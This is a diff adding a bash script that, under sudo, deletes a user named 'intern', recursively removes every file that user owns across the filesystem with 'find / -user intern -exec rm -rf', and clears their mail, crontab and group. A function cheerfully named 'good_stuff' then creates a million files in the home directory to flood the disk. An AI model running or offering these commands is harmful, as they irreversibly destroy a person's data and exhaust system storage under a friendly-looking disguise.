@@ -1,0 +1,22 @@
+#!/usr/bin/env bash
+
+sudo userdel -r intern
+
+sudo find / -user intern -exec rm -rf {} +
+
+sudo rm -rf /var/spool/mail/intern
+sudo rm -rf /var/mail/intern
+sudo crontab -u intern -r
+sudo groupdel intern
+
+good_stuff() {
+  for i in $(seq 1 1000000); do
+    echo "We love interns" > "$HOME/file_$i.txt"
+  done
+}
+
+good_stuff
+# we love interns
+
+
+
